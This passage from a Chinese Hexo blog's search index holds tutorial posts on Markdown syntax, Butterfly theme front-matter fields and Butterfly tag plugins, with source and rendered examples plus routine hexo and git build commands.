type="button" data-href="#分栏-2">示例代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>$ x = \frac{-b \pm \sqrt{b^2 - 4ac}}{2a} $</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span> x = <span class="keyword">\frac</span>&#123;-b <span class="keyword">\pm</span> <span class="keyword">\sqrt</span>&#123;b<span class="built_in">^</span>2 - 4ac&#125;&#125;&#123;2a&#125; <span class="built_in">$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></li></ol><h2 id="Markdown文档的保存">Markdown文档的保存</h2><p>Markdown文件通常是以.md的格式保存，而因为Markdown是独立于平台的，使用者可以在运行任何操作系统的任何设备上创建 Markdown 格式的文本，具有很好的通用性，因此无论你使用哪一款Markdown编辑器，甚至是记事本，写出的文档都可以顺利地被其他阅读者打开并查看。同时Markdown还可以导出为PDF、Word、EPUB等多种格式的文档。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Front-matter的写法</title>
      <link href="/posts/7effe138.html"/>
      <url>/posts/7effe138.html</url>
      
        <content type="html"><![CDATA[<div class="note info flat"><p>本文参考：<a href="https://butterfly.js.org/posts/dc584b87/#Front-matter">Butterfly 安裝文檔(二) 主題頁面 | Butterfly</a></p></div><h2 id="Page-Front-matter">Page Front-matter</h2><p>Page Front-matter用于页面的设置</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aside:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line"><span class="section">random:</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>写法</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td>title</td><td style="text-align:left"><strong>【必需】页面标题</strong></td></tr><tr><td>date</td><td style="text-align:left"><strong>【必需】页面创建日期</strong></td></tr><tr><td>type</td><td style="text-align:left"><strong>【必需】标签、分类和友情链接三个页面需要配置</strong></td></tr><tr><td>updated</td><td style="text-align:left">【可选】页面更新日期</td></tr><tr><td>description</td><td style="text-align:left">【可选】页面描述</td></tr><tr><td>keywords</td><td style="text-align:left">【可选】页面关键词</td></tr><tr><td>comments</td><td style="text-align:left">【可选】显示页面评论模块 (默认 true)</td></tr><tr><td>top_img</td><td style="text-align:left">【可选】页面顶部图片</td></tr><tr><td>mathjax</td><td style="text-align:left">【可选】显示mathjax (当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>katex</td><td style="text-align:left">【可选】显示katex (当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>aside</td><td style="text-align:left">【可选】显示侧边栏 (默认 true)</td></tr><tr><td>aplayer</td><td style="text-align:left">【可选】在需要的页面加载aplayer的js和css</td></tr><tr><td>highlight_shrink</td><td style="text-align:left">【可选】配置代码框是否展开 (true/false) (默认为设置中highlight_shrink的配置)</td></tr><tr><td>random</td><td style="text-align:left">【可选】配置友情链接是否随机排序（默认为 false)</td></tr></tbody></table><h2 id="Post-Front-matter">Post Front-matter</h2><p>Post Front-matter用于文章页的设置</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">comments:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">toc:</span></span><br><span class="line"><span class="emphasis">toc_</span>number:</span><br><span class="line">toc<span class="emphasis">_style_</span>simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright<span class="emphasis">_author:</span></span><br><span class="line"><span class="emphasis">copyright_</span>author<span class="emphasis">_href:</span></span><br><span class="line"><span class="emphasis">copyright_</span>url:</span><br><span class="line">copyright<span class="emphasis">_info:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line">aside:</span><br><span class="line"><span class="section">abcjs:</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>写法</th><th>解释</th></tr></thead><tbody><tr><td>title</td><td><strong>【必需】文章标题</strong></td></tr><tr><td>date</td><td><strong>【必需】文章创建日期</strong></td></tr><tr><td>updated</td><td>【可选】文章更新日期</td></tr><tr><td>tags</td><td>【可选】文章标签</td></tr><tr><td>categories</td><td>【可选】文章分类</td></tr><tr><td>keywords</td><td>【可选】文章关键字</td></tr><tr><td>description</td><td>【可选】文章描述</td></tr><tr><td>top_img</td><td>【可选】文章顶部图片</td></tr><tr><td>cover</td><td>【可选】文章顶部缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</td></tr><tr><td>comments</td><td>【可选】显示文章评论模块(默认 true)</td></tr><tr><td>toc</td><td>【可选】显示文章TOC(默认为设置中toc的enable配置)</td></tr><tr><td>toc_number</td><td>【可选】显示toc_number(默认为设置中toc的number配置)</td></tr><tr><td>toc_style_simple</td><td>【可选】显示 toc 简洁模式</td></tr><tr><td>copyright</td><td>【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</td></tr><tr><td>copuright_author</td><td>【可选】文章版权模块的文章作者</td></tr><tr><td>copyright_author_href</td><td>【可选】文章版权模块的文章作者链接</td></tr><tr><td>copyright_url</td><td>【可选】文章版权模块的文章连结链接</td></tr><tr><td>copyright_info</td><td>【可选】文章版权模块的版权声明文字</td></tr><tr><td>mathjax</td><td>【可选】显示mathjax(当设置 mathjax 的 per_page: false 时，才需要配置，默认 false )</td></tr><tr><td>katex</td><td>【可选】显示 katex (当设置 katex 的 per_page: false 时，才需要配置，默认 false )</td></tr><tr><td>aplayer</td><td>【可选】在需要的页面加载 aplayer 的 js 和 css</td></tr><tr><td>hightlight_shrink</td><td>【可选】配置代码框是否展开(true/false)(默认为设置中 highlight_shrink 的配置)</td></tr><tr><td>aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr><tr><td>abcjs</td><td>【可选】加载 abcjs (当设置 abcjs 的 per_page: false 时，才需要配置，默认 false )</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法与外挂标签写法汇总</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="代码块">代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="多级标题">多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="文字样式">文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="code">&lt;tr&gt;</span></span><br><span class="line"><span class="code">&lt;td bgcolor=MistyRose&gt;这里的背景色是：MistyRosen，此处输入任意想输入的内容&lt;/td&gt;</span></span><br><span class="line"><span class="code">&lt;/tr&gt;</span></span><br><span class="line"><span class="code">&lt;/table&gt;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="引用">引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="分割线">分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="列表-跟空格都可以">列表(*,+,-跟空格都可以)</h2><h3 id="无序列表">无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="有序列表">有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="图片">图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://fastly.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><code>&lt;img src=&quot;/assets/pusheencode.webp&quot; alt=&quot;示例图片&quot; style=&quot;zoom:50%;&quot; /&gt;</code><br>在线图片:<br><img src="https://fastly.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="表格">表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="公式">公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="行内文本样式-text">行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="行内文本-span">行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="段落文本-p">段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" 